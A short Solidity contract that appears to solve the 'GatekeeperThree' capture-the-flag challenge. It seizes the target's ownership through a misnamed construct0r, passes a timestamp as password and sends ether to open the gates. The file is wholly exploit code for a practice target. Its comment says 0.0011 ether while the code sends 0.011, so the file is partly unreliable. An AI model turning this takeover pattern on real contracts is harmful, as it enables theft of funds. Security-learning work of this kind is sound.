// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function createTrick() external;
    function construct0r() external;
    function getAllowance(uint256 _password) external;
    function enter() external;
}

contract GatekeeperThreeAttack {
    IGatekeeperThree gK;

    constructor(address gK_addr) {
        gK = IGatekeeperThree(gK_addr);
    }

    function attack(uint256 timestamp) public {
        // Call construct0r to pass gateOne
        gK.construct0r();

        // Call getAllowance to pass gateTwo
        gK.getAllowance(timestamp);

        // Send 0.0011 ether to pass gateThree
        (bool success, bytes memory data) = address(gK).call{value: 0.011 ether}("");
        require(success, "Failed to transfer ether to gK");

        // Now call enter to pass the challenge
        gK.enter();
    }
}
